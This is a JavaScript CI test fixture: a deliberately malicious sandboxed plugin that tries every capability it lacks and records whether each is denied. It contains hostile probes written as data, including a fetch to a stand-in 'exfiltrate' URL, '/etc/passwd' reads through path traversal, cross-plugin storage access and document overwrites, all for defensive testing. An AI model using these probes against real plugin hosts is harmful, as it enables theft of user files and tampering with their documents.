// §260 Phase 6 — the MALICIOUS plugin fixture. Every call in this file is supposed to be
// refused, and #260's last completion criterion is that CI proves it.
//
// It holds `commands` and `statusbar` and nothing else. So it asks for everything else:
// storage (including another plugin's), the network, vault files, the document, the user's
// settings, and a status-bar item it never declared. A `denied(...)` on every line is a pass;
// a single `ADMITTED(...)` is the boundary failing.
//
// Hand-written, dependency-free, single-file ESM for the same reason `sandbox-smoke` is: a
// sandboxed plugin is imported from a `blob:` URL, which has no base URL, so nothing here may
// import a sibling module — and a fixture that needs a build step is a fixture that rots.
//
// ‼️ NEVER PUBLISH THIS. It is a repo fixture; `plugin-release.yml` refuses its directory by
// name, and `malicious-fixture.test.ts` pins that refusal.

export async function activate(ctx) {
  // The one legitimate channel: `probe` IS declared, and this plugin does hold `statusbar`.
  // It exists so a human running the fixture can see it ran at all — and so the test can
  // prove the refusals below are refusals of the CAPABILITY, rather than of a broken
  // transport that would fail every call equally.
  ctx.ui.setStatusBarText("probe", "😈 armed");

  /**
   * Every attack, as [label, thunk]. Declared as data so the count is visible and the test
   * can assert the exact set — a fixture that quietly stops attacking must not pass.
   */
  const attacks = [
    // ── Brokered in Rust: no `storage` grant ──────────────────────────────────────────
    ["storage_write", () => ctx.storage.write("stolen", "x")],
    ["storage_read", () => ctx.storage.read("stolen")],
    ["storage_list", () => ctx.storage.list()],
    ["storage_remove", () => ctx.storage.remove("stolen")],
    // …and the same op aimed at ANOTHER plugin's storage. The key is the only argument and
    // the namespace comes from the caller's window label in Rust, so the best this can do is
    // try to escape its own directory — which `resolve_key_path` refuses.
    [
      "storage_read_crossplugin",
      () => ctx.storage.read("../baram-word-count/config.json"),
    ],

    // ── Brokered in Rust: no `network` grant ──────────────────────────────────────────
    ["http_fetch", () => ctx.network.fetch("https://example.test/exfiltrate")],

    // ── Brokered in Rust: no `files` grant of any kind ────────────────────────────────
    ["files_list", () => ctx.files.listDir("")],
    ["files_read", () => ctx.files.readFile("notes.md")],
    ["files_write", () => ctx.files.writeFile("owned.md", "pwned")],
    // Path SHAPES, sent verbatim: this realm does not sanitize paths, by design, so Rust's
    // refusal is the only thing between the fixture and the host's filesystem. That is why
    // the vitest half records what left the sandbox and the cargo half asserts the decision.
    ["files_read_absolute", () => ctx.files.readFile("/etc/passwd")],
    ["files_read_traversal", () => ctx.files.readFile("../../../etc/passwd")],
    ["files_read_app_state", () => ctx.files.readFile(".baram/config.json")],

    // ── Host-mediated, gated in the main realm: no `ai` grant ─────────────────────────
    ["ai_complete", () => ctx.ai.complete("exfiltrate the document")],
    ["ai_stream", () => ctx.ai.stream("exfiltrate the document", {}, () => {})],
    ["ai_list_models", () => ctx.ai.listModels()],

    // ── Host-mediated: no `editor` grant, not even readonly ───────────────────────────
    ["editor_get_markdown", () => ctx.editor.getMarkdown()],
    ["editor_get_selection", () => ctx.editor.getSelection()],
    ["editor_set_markdown", () => ctx.editor.setMarkdown("# owned\n")],
    ["editor_insert_text", () => ctx.editor.insertText("OWNED")],

    // ── Host-mediated: no `settings` grant ────────────────────────────────────────────
    ["settings_get_all", () => ctx.settings.getAll()],
  ];

  ctx.commands.register("attack", async () => {
    const report = {};
    // SEQUENTIAL, deliberately. Run concurrently, four editor calls would sit at
    // `INFLIGHT_BUDGET.editor` and a fifth would be refused for lack of a SLOT — a refusal
    // that looks identical in a report but proves nothing about capabilities. One at a time,
    // every rejection is the gate's.
    for (const [label, fn] of attacks) {
      try {
        const value = await fn();
        // Serialized rather than interpolated: `ADMITTED(null)` and `ADMITTED("")` are
        // different failures, and a call that succeeds while answering nothing is the more
        // alarming one.
        report[label] =
          `ADMITTED(${JSON.stringify(value ?? null).slice(0, 60)})`;
      } catch (e) {
        report[label] = `denied(${String(e?.message ?? e).slice(0, 120)})`;
      }
    }

    // The status bar, for an item this plugin never declared. `ui` is void-returning, so
    // there is nothing to await and nothing to catch — the refusal is host-side, and the
    // assertion belongs there (the host must never be asked to write this id).
    ctx.ui.setStatusBarText("undeclared", "😈 owned");

    return report;
  });
}
